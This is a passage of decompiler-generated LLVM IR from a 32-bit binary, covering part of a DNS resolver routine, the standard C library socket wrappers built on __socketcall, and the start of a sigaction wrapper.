  %v1_1001e714 = add i32 %v0_1001e708, -12
  store i32 %v1_1001e714, i32* %r0.global-to-local, align 4
  %tmp27 = icmp ult i32 %v1_1001e714, 32
  br i1 %tmp27, label %dec_label_pc_1001e964, label %dec_label_pc_1001e720

dec_label_pc_1001e720:                            ; preds = %dec_label_pc_1001e714
  %tmp28 = icmp ult i32 %v0_1001e708, 16
  br i1 %tmp28, label %dec_label_pc_1001e964, label %dec_label_pc_1001e728

dec_label_pc_1001e728:                            ; preds = %dec_label_pc_1001e720
  %v1_1001e728 = add i32 %v0_1001e708, -16
  store i32 %v1_1001e728, i32* %r0.global-to-local, align 4
  %tmp29 = icmp ult i32 %v1_1001e728, 8
  br i1 %tmp29, label %dec_label_pc_1001e964, label %dec_label_pc_1001e734

dec_label_pc_1001e734:                            ; preds = %dec_label_pc_1001e728
  %v1_1001e734 = add i32 %v0_1001e708, -24
  store i32 %v1_1001e734, i32* %r0.global-to-local, align 4
  %v1_1001e738 = add i32 %v0_1001e708, -44
  store i32 %v1_1001e738, i32* @r24, align 4
  %v3_1001e73c = icmp ugt i32 %v1_1001e734, %v1_1001e738
  %v0_1001e740 = load i32, i32* @r31, align 4
  %v1_1001e740 = add i32 %v0_1001e740, 4
  store i32 %v1_1001e740, i32* %r20.global-to-local, align 4
  %v1_1001e744 = add i32 %v0_1001e740, 12
  store i32 %v1_1001e744, i32* @r21, align 4
  %v1_1001e748 = add i32 %v0_1001e740, 16
  store i32 %v1_1001e748, i32* %r23.global-to-local, align 4
  %v1_1001e74c = add i32 %v0_1001e740, 44
  store i32 %v1_1001e74c, i32* @r30, align 4
  br i1 %v3_1001e73c, label %dec_label_pc_1001e75c, label %dec_label_pc_1001e754

dec_label_pc_1001e754:                            ; preds = %dec_label_pc_1001e734
  store i32 %v1_1001e734, i32* @r24, align 4
  %v1_1001e758 = add i32 %v0_1001e740, 24
  store i32 %v1_1001e758, i32* @r30, align 4
  br label %dec_label_pc_1001e75c

dec_label_pc_1001e75c:                            ; preds = %dec_label_pc_1001e734, %dec_label_pc_1001e754
  %v0_1001e75c = phi i32 [ %v1_1001e734, %dec_label_pc_1001e754 ], [ %v1_1001e738, %dec_label_pc_1001e734 ]
  %tmp30 = icmp ult i32 %v0_1001e75c, 256
  br i1 %tmp30, label %dec_label_pc_1001e964, label %dec_label_pc_1001e764

dec_label_pc_1001e764:                            ; preds = %dec_label_pc_1001e75c
  %v0_1001e764 = load i32, i32* @r22, align 4
  %v3_1001e764 = icmp eq i32 %v0_1001e764, 2
  br i1 %v3_1001e764, label %dec_label_pc_1001e76c, label %dec_label_pc_1001e7a8

dec_label_pc_1001e76c:                            ; preds = %dec_label_pc_1001e764
  %v0_1001e76c = load i32, i32* @r27, align 4
  store i32 %v0_1001e76c, i32* @r5, align 4
  %v0_1001e770 = load i32, i32* @r28, align 4
  store i32 %v0_1001e770, i32* @r4, align 4
  store i32 %v0_1001e740, i32* @r3, align 4
  store i32 268560252, i32* @lr, align 4
  %v0_1001e778 = call i32 @memcpy()
  %v0_1001e77c = load i32, i32* @r31, align 4
  %v1_1001e77c = load i32, i32* %r20.global-to-local, align 4
  %v2_1001e77c = inttoptr i32 %v1_1001e77c to i32*
  store i32 %v0_1001e77c, i32* %v2_1001e77c, align 4
  %v0_1001e784 = load i32, i32* @r30, align 4
  store i32 %v0_1001e784, i32* @r3, align 4
  %v0_1001e78c = load i32, i32* @r28, align 4
  %v1_1001e78c = inttoptr i32 %v0_1001e78c to i8*
  %v2_1001e78c = load i8, i8* %v1_1001e78c, align 1
  %v3_1001e78c = zext i8 %v2_1001e78c to i32
  store i32 %v3_1001e78c, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1001e7a4.1223 to i32), i32* @lr, align 4
  %v1_1001e7a0 = call i32 @sprintf(i32 %v0_1001e784)
  br label %dec_label_pc_1001e804

dec_label_pc_1001e7a8:                            ; preds = %dec_label_pc_1001e764
  %v0_1001e7a8 = load i32, i32* @r28, align 4
  store i32 %v0_1001e7a8, i32* @r4, align 4
  store i32 %v0_1001e740, i32* @r3, align 4
  %v0_1001e7b0 = load i32, i32* @r27, align 4
  store i32 %v0_1001e7b0, i32* @r5, align 4
  %v1_1001e7b4 = add i32 %v0_1001e7b0, -1
  store i32 %v1_1001e7b4, i32* %r29.global-to-local, align 4
  store i32 268560316, i32* @lr, align 4
  %v0_1001e7b8 = call i32 @memcpy()
  %v0_1001e7bc = load i32, i32* @r30, align 4
  store i32 %v0_1001e7bc, i32* %r28.global-to-local, align 4
  %v0_1001e7c0 = load i32, i32* @r31, align 4
  %v1_1001e7c0 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001e7c0 = inttoptr i32 %v1_1001e7c0 to i32*
  store i32 %v0_1001e7c0, i32* %v2_1001e7c0, align 4
  %v0_1001e7e44 = load i32, i32* %r29.global-to-local, align 4
  %v0_1001e7f08 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1001e7f08, i32* @r3, align 4
  %tmp31 = icmp sgt i32 %v0_1001e7e44, -1
  br i1 %tmp31, label %dec_label_pc_1001e7c8, label %dec_label_pc_1001e7f8

dec_label_pc_1001e7c8:                            ; preds = %dec_label_pc_1001e7a8, %dec_label_pc_1001e7c8
  %v1_1001e7c8 = phi i32 [ %v0_1001e7e4, %dec_label_pc_1001e7c8 ], [ %v0_1001e7e44, %dec_label_pc_1001e7a8 ]
  %v0_1001e7f09 = phi i32 [ %v2_1001e7e0, %dec_label_pc_1001e7c8 ], [ %v0_1001e7f08, %dec_label_pc_1001e7a8 ]
  %v1_1001e7cc = add i32 %v1_1001e7c8, -1
  store i32 %v1_1001e7cc, i32* %r29.global-to-local, align 4
  store i32 268560352, i32* @lr, align 4
  %v1_1001e7dc = call i32 @sprintf(i32 %v0_1001e7f09)
  %v0_1001e7e0 = load i32, i32* @r28, align 4
  %v2_1001e7e0 = add i32 %v0_1001e7e0, %v1_1001e7dc
  store i32 %v2_1001e7e0, i32* %r28.global-to-local, align 4
  %v0_1001e7e4 = load i32, i32* @r29, align 4
  store i32 %v2_1001e7e0, i32* @r3, align 4
  %tmp32 = icmp sgt i32 %v0_1001e7e4, -1
  br i1 %tmp32, label %dec_label_pc_1001e7c8, label %dec_label_pc_1001e7f8

dec_label_pc_1001e7f8:                            ; preds = %dec_label_pc_1001e7c8, %dec_label_pc_1001e7a8
  %v0_1001e7f0.lcssa = phi i32 [ %v0_1001e7f08, %dec_label_pc_1001e7a8 ], [ %v2_1001e7e0, %dec_label_pc_1001e7c8 ]
  %v4_1001e800 = call i32 @strcpy(i32 %v0_1001e7f0.lcssa, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002f0b8.1225, i32 0, i32 0))
  br label %dec_label_pc_1001e804

dec_label_pc_1001e804:                            ; preds = %dec_label_pc_1001e76c, %dec_label_pc_1001e7f8
  %storemerge = phi i32 [ %v4_1001e800, %dec_label_pc_1001e7f8 ], [ %v1_1001e7a0, %dec_label_pc_1001e76c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_1001e80c = load i32, i32* %r20.global-to-local, align 4
  %v2_1001e80c = add i32 %v1_1001e80c, 4
  %v3_1001e80c = inttoptr i32 %v2_1001e80c to i32*
  store i32 0, i32* %v3_1001e80c, align 4
  %v0_1001e810 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e810 = load i32, i32* @r21, align 4
  %v2_1001e810 = add i32 %v1_1001e810, 4
  %v3_1001e810 = inttoptr i32 %v2_1001e810 to i32*
  store i32 %v0_1001e810, i32* %v3_1001e810, align 4
  %v0_1001e814 = load i32, i32* @r30, align 4
  %v1_1001e814 = load i32, i32* @r21, align 4
  %v2_1001e814 = inttoptr i32 %v1_1001e814 to i32*
  store i32 %v0_1001e814, i32* %v2_1001e814, align 4
  %v2_1001e81c = ptrtoint i32* %stack_var_-116 to i32
  %v2_1001e864 = ptrtoint i32* %stack_var_-120 to i32
  %v3_1001e8a4 = icmp eq i32 %tmp18, 5
  %v0_1001e834.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001e818

dec_label_pc_1001e818:                            ; preds = %dec_label_pc_1001e8ac, %dec_label_pc_1001e804
  %v0_1001e834 = phi i32 [ %v0_1001e8c8, %dec_label_pc_1001e8ac ], [ %v0_1001e834.pre, %dec_label_pc_1001e804 ]
  store i32 %v2_1001e81c, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1001e81c, i32* %r3.global-to-local, align 4
  %v1_1001e834 = add i32 %v0_1001e834, 1
  store i32 %v1_1001e834, i32* %r31.global-to-local, align 4
  %v4_1001e838 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-116, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r3.global-to-local, align 4
  store i32 268560452, i32* @lr, align 4
  %v1_1001e840 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v3_1001e848 = load i32, i32* @global_var_1004526c.1212, align 4
  store i32 %v3_1001e848, i32* @r29, align 4
  store i32 %v2_1001e81c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268560472, i32* @lr, align 4
  %v0_1001e854 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001e85c = load i32, i32* @r29, align 4
  %v0_1001e870 = load i32, i32* @r30, align 4
  store i32 %v0_1001e870, i32* %r3.global-to-local, align 4
  store i32 268560504, i32* @lr, align 4
  %v6_1001e874 = inttoptr i32 %v0_1001e870 to i8*
  %v7_1001e874 = call i32 @__dns_lookup(i8* %v6_1001e874, i32 12, i32 %v0_1001e85c, i32 ptrtoint (i32* @global_var_1004eee4.1213 to i32), i32 %v2_1001e864, i32 %v2_1001e680)
  %v0_1001e878 = load i32, i32* @r24, align 4
  %v1_1001e87c = icmp slt i32 %v7_1001e874, 0
  %v0_1001e880 = load i32, i32* @r30, align 4
  store i32 %v0_1001e880, i32* %r3.global-to-local, align 4
  br i1 %v1_1001e87c, label %dec_label_pc_1001e94c, label %dec_label_pc_1001e888

dec_label_pc_1001e888:                            ; preds = %dec_label_pc_1001e818
  %v3_1001e888 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e888, i32* @r4, align 4
  store i32 268560528, i32* @lr, align 4
  %v3_1001e88c = call i32 @strncpy(i32 %v0_1001e880, i32 %v3_1001e888, i32 %v0_1001e878)
  %v3_1001e890 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e890, i32* @r3, align 4
  store i32 268560536, i32* @lr, align 4
  %v0_1001e894 = call i32 @free()
  store i32 %v0_1001e894, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v0_1001e89c = load i32, i32* @r30, align 4
  %v0_1001e8a0 = load i32, i32* @r24, align 4
  br i1 %v3_1001e8a4, label %dec_label_pc_1001e8ac, label %dec_label_pc_1001e8d8

dec_label_pc_1001e8ac:                            ; preds = %dec_label_pc_1001e888
  store i32 %tmp17, i32* @r4, align 4
  %v3_1001e8b0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8b0, i32* %r3.global-to-local, align 4
  store i32 268560568, i32* @lr, align 4
  %v4_1001e8b4 = call i32 @__decode_dotted(i32 %v3_1001e8b0, i32 %tmp17, i32 %v0_1001e89c, i32 %v0_1001e8a0)
  store i32 %v4_1001e8b4, i32* @r29, align 4
  %v3_1001e8bc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8bc, i32* @r3, align 4
  store i32 268560580, i32* @lr, align 4
  %v0_1001e8c0 = call i32 @free()
  store i32 %v0_1001e8c0, i32* %r3.global-to-local, align 4
  %v0_1001e8c4 = load i32, i32* @r29, align 4
  %v0_1001e8c8 = load i32, i32* @r31, align 4
  %v0_1001e8cc.not = icmp sgt i32 %v0_1001e8c4, -1
  %tmp33 = icmp slt i32 %v0_1001e8c8, 6
  %or.cond = and i1 %tmp33, %v0_1001e8cc.not
  br i1 %or.cond, label %dec_label_pc_1001e818, label %dec_label_pc_1001e958

dec_label_pc_1001e8d8:                            ; preds = %dec_label_pc_1001e888
  %v3_1001e8d8 = icmp eq i32 %tmp18, 12
  %v3_1001e8dc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8dc, i32* @r3, align 4
  br i1 %v3_1001e8d8, label %dec_label_pc_1001e8e4, label %dec_label_pc_1001e934

dec_label_pc_1001e8e4:                            ; preds = %dec_label_pc_1001e8d8
  store i32 %tmp17, i32* @r4, align 4
  store i32 268560628, i32* @lr, align 4
  %v4_1001e8f0 = call i32 @__decode_dotted(i32 %v3_1001e8dc, i32 %tmp17, i32 %v0_1001e89c, i32 %v0_1001e8a0)
  %v3_1001e8f4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e8f4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e8fc.1227 to i32), i32* @lr, align 4
  %v0_1001e8f8 = call i32 @free()
  store i32 %v0_1001e8f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001e900 = load i32, i32* @r22, align 4
  %v3_1001e900 = icmp eq i32 %v0_1001e900, 2
  %v0_1001e904 = load i32, i32* @r30, align 4
  %v1_1001e904 = load i32, i32* @r26, align 4
  %v2_1001e904 = inttoptr i32 %v1_1001e904 to i32*
  store i32 %v0_1001e904, i32* %v2_1001e904, align 4
  %v0_1001e908 = load i32, i32* @r22, align 4
  %v1_1001e908 = load i32, i32* @r26, align 4
  %v2_1001e908 = add i32 %v1_1001e908, 8
  %v3_1001e908 = inttoptr i32 %v2_1001e908 to i32*
  store i32 %v0_1001e908, i32* %v3_1001e908, align 4
  br i1 %v3_1001e900, label %dec_label_pc_1001e8e4.dec_label_pc_1001e914_crit_edge, label %dec_label_pc_1001e910

dec_label_pc_1001e8e4.dec_label_pc_1001e914_crit_edge: ; preds = %dec_label_pc_1001e8e4
  %v0_1001e914.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e914

dec_label_pc_1001e910:                            ; preds = %dec_label_pc_1001e8e4
  store i32 16, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e914

dec_label_pc_1001e914:                            ; preds = %dec_label_pc_1001e8e4.dec_label_pc_1001e914_crit_edge, %dec_label_pc_1001e910
  %v0_1001e914 = phi i32 [ %v0_1001e914.pre, %dec_label_pc_1001e8e4.dec_label_pc_1001e914_crit_edge ], [ 16, %dec_label_pc_1001e910 ]
  %v1_1001e914 = load i32, i32* @r26, align 4
  %v2_1001e914 = add i32 %v1_1001e914, 12
  %v3_1001e914 = inttoptr i32 %v2_1001e914 to i32*
  store i32 %v0_1001e914, i32* %v3_1001e914, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1001e91c = load i32, i32* @r20, align 4
  %v1_1001e91c = load i32, i32* @r26, align 4
  %v2_1001e91c = add i32 %v1_1001e91c, 16
  %v3_1001e91c = inttoptr i32 %v2_1001e91c to i32*
  store i32 %v0_1001e91c, i32* %v3_1001e91c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001e924 = load i32, i32* @r21, align 4
  %v1_1001e924 = load i32, i32* @r26, align 4
  %v2_1001e924 = add i32 %v1_1001e924, 4
  %v3_1001e924 = inttoptr i32 %v2_1001e924 to i32*
  store i32 %v0_1001e924, i32* %v3_1001e924, align 4
  %v0_1001e928 = load i32, i32* @r26, align 4
  %v1_1001e928 = load i32, i32* @r19, align 4
  %v2_1001e928 = inttoptr i32 %v1_1001e928 to i32*
  store i32 %v0_1001e928, i32* %v2_1001e928, align 4
  %v0_1001e92c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e92c

dec_label_pc_1001e92c:                            ; preds = %dec_label_pc_1001e958, %dec_label_pc_1001e94c, %dec_label_pc_1001e934, %dec_label_pc_1001e914
  %v0_1001e92c = phi i32 [ 3, %dec_label_pc_1001e958 ], [ 1, %dec_label_pc_1001e94c ], [ 4, %dec_label_pc_1001e934 ], [ %v0_1001e92c.pre, %dec_label_pc_1001e914 ]
  %v1_1001e92c = load i32, i32* @r25, align 4
  %v2_1001e92c = inttoptr i32 %v1_1001e92c to i32*
  store i32 %v0_1001e92c, i32* %v2_1001e92c, align 4
  %v0_1001e978.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e968

dec_label_pc_1001e934:                            ; preds = %dec_label_pc_1001e8d8
  store i32 ptrtoint ([3 x i8]* @global_var_1001e938.1228 to i32), i32* @lr, align 4
  %v0_1001e934 = call i32 @free()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e92c

dec_label_pc_1001e944:                            ; preds = %dec_label_pc_1001e6a4, %dec_label_pc_1001e6b0, %dec_label_pc_1001e698, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e968

dec_label_pc_1001e94c:                            ; preds = %dec_label_pc_1001e818
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e92c

dec_label_pc_1001e958:                            ; preds = %dec_label_pc_1001e8ac
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e92c

dec_label_pc_1001e964:                            ; preds = %dec_label_pc_1001e75c, %dec_label_pc_1001e728, %dec_label_pc_1001e720, %dec_label_pc_1001e714, %dec_label_pc_1001e708, %dec_label_pc_1001e6f4
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e968

dec_label_pc_1001e968:                            ; preds = %dec_label_pc_1001e6ec, %dec_label_pc_1001e6b4, %dec_label_pc_1001e944, %dec_label_pc_1001e92c, %dec_label_pc_1001e964
  %v0_1001e978 = phi i32 [ %v8_1001e6d4, %dec_label_pc_1001e6ec ], [ 0, %dec_label_pc_1001e6b4 ], [ 22, %dec_label_pc_1001e944 ], [ %v0_1001e978.pre, %dec_label_pc_1001e92c ], [ 34, %dec_label_pc_1001e964 ]
  store i32 %v0_1001e648, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001e978

; uselistorder directives
  uselistorder i32 %v0_1001e8c8, { 1, 0 }
  uselistorder i32 %v0_1001e7e4, { 1, 0 }
  uselistorder i32 %v2_1001e7e0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1001e7f08, { 1, 0, 2 }
  uselistorder i32 %v0_1001e740, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1001e708, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %tmp18, { 0, 2, 1 }
  uselistorder i32 %tmp17, { 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18, 2, 19, 20, 0 }
  uselistorder i32 -16, { 32, 33, 34, 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 12, 10, 13, 11, 16, 14, 17, 15, 19, 18, 22, 20, 23, 21, 25, 24, 27, 26, 29, 28, 31, 30, 35 }
  uselistorder i32 ()* @__open_nameservers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001e968, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1001e944, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001e914, { 1, 0 }
  uselistorder label %dec_label_pc_1001e804, { 1, 0 }
  uselistorder label %dec_label_pc_1001e7c8, { 1, 0 }
  uselistorder label %dec_label_pc_1001e75c, { 1, 0 }
  uselistorder label %dec_label_pc_1001e6b4, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001e990 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268560800, i32* @lr, align 4
  %v2_1001e99c = call i32 @__socketcall(i32 5, i32 %v2_1001e990)
  ret i32 %v2_1001e99c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_1001e9b8 = load i32, i32* @r3, align 4
  store i32 %v0_1001e9b8, i32* %stack_var_-24, align 4
  %v2_1001e9c4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268560852, i32* @lr, align 4
  %v2_1001e9d0 = call i32 @__socketcall(i32 2, i32 %v2_1001e9c4)
  ret i32 %v2_1001e9d0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001e9f8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268560904, i32* @lr, align 4
  %v2_1001ea04 = call i32 @__socketcall(i32 3, i32 %v2_1001e9f8)
  ret i32 %v2_1001ea04

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ea2c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268560964, i32* @lr, align 4
  %v2_1001ea40 = call i32 @__socketcall(i32 15, i32 %v2_1001ea2c)
  ret i32 %v2_1001ea40

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001ea68 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561012, i32* @lr, align 4
  %v2_1001ea70 = call i32 @__socketcall(i32 4, i32 %v2_1001ea68)
  ret i32 %v2_1001ea70

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001ea98 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561068, i32* @lr, align 4
  %v2_1001eaa8 = call i32 @__socketcall(i32 10, i32 %v2_1001ea98)
  ret i32 %v2_1001eaa8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ead0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268561132, i32* @lr, align 4
  %v2_1001eae8 = call i32 @__socketcall(i32 12, i32 %v2_1001ead0)
  ret i32 %v2_1001eae8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eb10 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561184, i32* @lr, align 4
  %v2_1001eb1c = call i32 @__socketcall(i32 17, i32 %v2_1001eb10)
  ret i32 %v2_1001eb1c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eb44 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561240, i32* @lr, align 4
  %v2_1001eb54 = call i32 @__socketcall(i32 9, i32 %v2_1001eb44)
  ret i32 %v2_1001eb54

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001eb7c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561292, i32* @lr, align 4
  %v2_1001eb88 = call i32 @__socketcall(i32 16, i32 %v2_1001eb7c)
  ret i32 %v2_1001eb88

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ebb0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268561356, i32* @lr, align 4
  %v2_1001ebc8 = call i32 @__socketcall(i32 11, i32 %v2_1001ebb0)
  ret i32 %v2_1001ebc8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001ebf0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268561416, i32* @lr, align 4
  %v2_1001ec04 = call i32 @__socketcall(i32 14, i32 %v2_1001ebf0)
  ret i32 %v2_1001ec04

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001ec2c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561468, i32* @lr, align 4
  %v2_1001ec38 = call i32 @__socketcall(i32 1, i32 %v2_1001ec2c)
  ret i32 %v2_1001ec38

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 1, 0, 8, 12, 7, 11, 10, 5, 4, 9, 6, 2, 3 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1001ec50 = load i32, i32* @lr, align 4
  store i32 %v0_1001ec50, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1001ec5c = icmp eq i32* %arg2, null
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1001ec6c = add i32 %tmp, 4
  store i32 %v1_1001ec6c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1001ec74 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1001ec74, i32* @r3, align 4
  br i1 %v3_1001ec5c, label %dec_label_pc_1001ec9c, label %dec_label_pc_1001ec7c

dec_label_pc_1001ec7c:                            ; preds = %entry
  %v2_1001ec7c = load i32, i32* %arg2, align 4
  store i32 %v2_1001ec7c, i32* %r0.global-to-local, align 4
  store i32 268561544, i32* @lr, align 4
  %v0_1001ec84 = call i32 @memcpy()
  %v0_1001ec88 = load i32, i32* @r31, align 4
  %v1_1001ec88 = add i32 %v0_1001ec88, 132
  %v2_1001ec88 = inttoptr i32 %v1_1001ec88 to i32*
  %v3_1001ec88 = load i32, i32* %v2_1001ec88, align 4
  store i32 %v3_1001ec88, i32* %r0.global-to-local, align 4
  %v1_1001ec94 = add i32 %v0_1001ec88, 136
  %v2_1001ec94 = inttoptr i32 %v1_1001ec94 to i32*
  %v3_1001ec94 = load i32, i32* %v2_1001ec94, align 4
  store i32 %v3_1001ec94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001ec9c

dec_label_pc_1001ec9c:                            ; preds = %entry, %dec_label_pc_1001ec7c
  store i32 268561596, i32* @lr, align 4
  %v0_1001ecb8 = call i32 @__syscall_rt_sigaction()
  %v0_1001ecbc = load i32, i32* @r30, align 4
  %v3_1001ecbc = icmp eq i32 %v0_1001ecbc, 0
  store i32 %v0_1001ecb8, i32* @r31, align 4
  br i1 %v3_1001ecbc, label %dec_label_pc_1001ecf8, label %dec_label_pc_1001eccc

dec_label_pc_1001eccc:                            ; preds = %dec_label_pc_1001ec9c
  %v1_1001ecc4 = icmp slt i32 %v0_1001ecb8, 0
  %v1_1001eccc = add i32 %v0_1001ecbc, 4
  store i32 %v1_1001eccc, i32* @r3, align 4
  %v2_1001ecd0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1001ecd0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1001ecc4, label %dec_label_pc_1001ecf8, label %dec_label_pc_1001ecdc

dec_label_pc_1001ecdc:                            ; preds = %dec_label_pc_1001eccc
  %v3_1001ecdc = load i32, i32* %stack_var_-172, align 4
